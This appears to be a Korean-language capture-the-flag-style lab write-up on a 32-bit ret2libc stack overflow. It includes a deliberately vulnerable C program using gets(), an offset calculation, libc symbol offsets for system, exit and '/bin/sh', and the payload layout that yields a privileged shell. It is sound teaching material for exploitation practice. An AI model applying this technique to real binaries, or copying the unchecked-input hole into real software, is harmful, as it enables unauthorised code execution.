# bof-ret2libc-basic (ASLR OFF)

## 1. 목표

이 실습에서는 **Stack Buffer Overflow**를 이용해
saved return address를 덮고, **libc의 `system("/bin/sh")`를 호출하는 ret2libc 공격**을 수행한다.

* 쉘코드 주입 없이
* NX가 활성화된 환경에서
* ASLR이 비활성화된 상태를 가정한다.

---

## 2. 실습 환경

* Architecture: x86 (32-bit)
* OS: Ubuntu 24.04
* ASLR: Disabled
* PIE: Disabled
* Stack Canary: Disabled
* NX: Enabled
* RELRO: Partial

### checksec

```
RELRO           Partial RELRO
Stack Canary    No canary found
NX              NX enabled
PIE             No PIE
```

---

## 3. 취약 코드

```c
// filename: vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[24];
    puts("input:");
    gets(buf);   // stack buffer overflow
}

int main() {
    setregid(getegid(), getegid());
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("done");
    return 0;
}
```

### 취약점 요약

* `gets()`는 입력 길이를 검사하지 않으므로 버퍼 오버플로우 발생
* `buf`를 넘어 saved return address까지 덮을 수 있음
* NX가 활성화되어 있어 쉘코드 실행은 불가 → ret2libc 사용

---

## 4. 스택 프레임 분석

`vuln()` 함수의 일부 어셈블리:

```asm
lea eax, [ebp-0x20]   ; buf 위치
call gets@plt
```

* `buf`는 `[ebp-0x20]`에 위치
* saved EBP: 4 bytes
* saved RET: 4 bytes

### offset 계산

```
buf → saved EBP : 0x20
saved EBP       : 0x4
----------------------
offset           = 0x24 (36 bytes)
```

---

## 5. libc 주소 분석

ASLR이 비활성화된 환경이므로, libc는 항상 동일한 base address에 매핑된다.

### libc base

```
libc base = 0xf7d75000
```

### libc 내부 offset (파일 기준)

```bash
$ nm -D libc.so.6 | grep " system@@"
00050430 system@@GLIBC_2.0

$ nm -D libc.so.6 | grep " exit@@"
0003ebd0 exit@@GLIBC_2.0

$ strings -a -t x libc.so.6 | grep "/bin/sh"
1c4de8 /bin/sh
```

> **노트 ─ libc base + offset 사용 이유**
>
> ASLR 환경에서는 libc의 base address는 매 실행마다 달라지지만,
> libc 내부 함수와 문자열의 offset은 고정되어 있으므로
> base + offset 방식으로 주소를 계산한다.
>
> 이번 실습에서는 ASLR이 비활성화되어 있어 계산 과정이 필수는 아니지만,
> ASLR 활성화 환경으로의 확장을 고려하여 base + offset 방식을 사용하였다.

---

## 6. payload 구조 (32-bit cdecl)

```
[ padding (0x24) ]
[ system() ]
[ exit()   ]
[ "/bin/sh" ]
```

### 원래 상태 (vuln 진입 직후)

```
[높은주소]
+--------------+
│  saved RET   │ 체인 시작점
+--------------+ [ebp+0x4]
│  saved ebp   │
+--------------+ ← ebp
│      ...     │
+--------------+
│              │ buf
+--------------+ [ebp-0x20]
[낮은주소]
```
- `ret`는 saved RET 값을 EIP로 pop
- 정상 흐름이면 main으로 복귀

### overflow 이후 실제로 만들어진 스택

```
[높은주소]
+--------------+
│   "/bin/sh"  │ system()의 인자 역할
+--------------+
│     exit()   │ system()의 saved RET 역할
+--------------+
│   system()   │ vuln()의 saved RET (ret로 점프)
+--------------+ [ebp+0x4]
│      AAA     │ 덮인 EBP (의미 없음)
+--------------+ ← ebp
│      ...     │
+--------------+
│      AAA     │ buf
+--------------+ [ebp-0x20]
[낮은주소]
```

saved return address를 system()으로 덮고,
그 다음 스택 슬롯에 exit()과 "/bin/sh"를 배치함으로써
ret 명령을 함수 호출처럼 활용한다.

- `vuln()` 마지막에 `ret` → EIP에 `system()` 주소가 들어감
  - `system()`의 첫 번째 인자 : "/bin/sh"
  - `system()`의 saved RET : `exit()` 주소

---

## 7. 결과

쉘 획득 후 `id` 확인:

![check](https://github.com/sage-502/pwnable-lab/blob/main/images/bof-ret2libc-basic/02.png)

`setregid(getegid(), getegid())`에 의해
쉘은 root group 권한을 유지한 채 실행됨을 확인할 수 있다.
